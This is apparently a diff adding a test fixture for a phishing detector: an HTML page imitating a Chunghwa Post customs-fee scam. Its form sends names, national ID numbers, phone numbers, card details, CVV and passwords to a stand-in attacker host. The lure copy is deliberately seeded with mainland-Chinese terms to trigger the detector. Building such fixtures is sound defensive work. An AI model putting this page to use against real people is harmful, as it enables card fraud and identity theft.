@@ -1,0 +1,85 @@
+<!doctype html>
+<!--
+  ============================================================================
+  FOR LOCAL TESTING ONLY — DO NOT DEPLOY.
+  Mimics a 中華郵政 包裹補繳關稅 scam page. Used to exercise:
+    - fake-gov-tw signal (page claims "中華郵政" while eTLD+1 is .tk)
+    - cross-strait term detector (sprinkles 短信 / 激活 / 賬號)
+    - Stage 2 credential harvest (cross-eTLD+1 form action + card)
+  All marks belong to their owners; defensive security research only.
+  ============================================================================
+-->
+<html lang="zh-Hant-TW">
+  <head>
+    <meta charset="UTF-8" />
+    <title>中華郵政 — 包裹補繳關稅通知</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body { margin: 0; font-family: "Microsoft JhengHei", "微軟正黑體", system-ui, sans-serif; background: #f1f5f9; color: #0f172a; }
+      header { background: #006b3c; color: white; padding: 16px 24px; }
+      header .logo { display: flex; align-items: center; gap: 10px; }
+      header .mark { width: 40px; height: 40px; background: #ffd400; border-radius: 50%; display: grid; place-items: center; font-weight: 800; color: #006b3c; }
+      .card { max-width: 520px; margin: 32px auto; background: white; padding: 32px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+      h1 { font-size: 22px; margin: 0 0 12px; color: #006b3c; }
+      .alert { background: #fef3c7; border-left: 4px solid #f59e0b; padding: 12px 14px; font-size: 14px; margin: 14px 0; }
+      label { display: block; font-size: 14px; margin: 14px 0 6px; }
+      input, select { width: 100%; padding: 10px; border: 1px solid #cbd5e1; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
+      button { width: 100%; margin-top: 22px; background: #006b3c; color: white; border: 0; padding: 12px; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
+      .legalese { font-size: 11px; color: #64748b; margin-top: 16px; }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="logo">
+        <div class="mark">郵</div>
+        <div>
+          <div style="font-size:18px;font-weight:700">中華郵政 Chunghwa Post</div>
+          <div style="font-size:12px;opacity:0.85">海關進口包裹補繳作業</div>
+        </div>
+      </div>
+    </header>
+
+    <main class="card">
+      <h1>您有一件待領包裹需補繳關稅</h1>
+      <p>親愛的顧客您好，</p>
+      <p>
+        我們已通過短信告知您的包裹（編號 <strong>EM118427991TW</strong>）因海關需要補繳關稅與處理費共
+        <strong>NT$ 247</strong>，請於 24 小時內完成線上繳費，逾期將退回寄件人並產生滯納金。
+      </p>
+
+      <div class="alert">
+        ⚠ 注意：本通知為信息系統自動發送，請勿回覆此封信件。如需查詢請至 165 反詐騙專線確認。
+        系統暫不接受臨櫃補繳，請使用線上信用卡支付完成激活並查詢您的賬號狀態。
+      </div>
+
+      <!--
+        Form posts to a different eTLD+1 (.zip) — credential + card harvest.
+        cross-strait words sprinkled into copy above:  短信 / 信息 / 激活 / 賬號
+        — all mainland-Chinese-only and never used by real 中華郵政.
+      -->
+      <form action="https://chtpost-pay.example-evil.zip/submit" method="post">
+        <label>收件人姓名</label>
+        <input type="text" name="name" required />
+
+        <label>身分證字號</label>
+        <input type="text" name="id_no" pattern="[A-Z][0-9]{9}" required />
+
+        <label>手機號碼（用於接收短信驗證碼）</label>
+        <input type="tel" name="phone" inputmode="tel" required />
+
+        <label>信用卡號</label>
+        <input type="text" name="card" inputmode="numeric" maxlength="19" required />
+
+        <label>有效期 (MM/YY) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 安全碼 CVV</label>
+        <input type="text" name="combined" placeholder="MM/YY  CVV" required />
+
+        <label>登入賬號密碼（用於查詢繳費紀錄）</label>
+        <input type="password" name="password" required />
+
+        <button type="submit">立即補繳 NT$ 247</button>
+      </form>
+
+      <p class="legalese">© 中華郵政 Chunghwa Post 1896–2026. 版權所有.</p>
+    </main>
+  </body>
+</html>
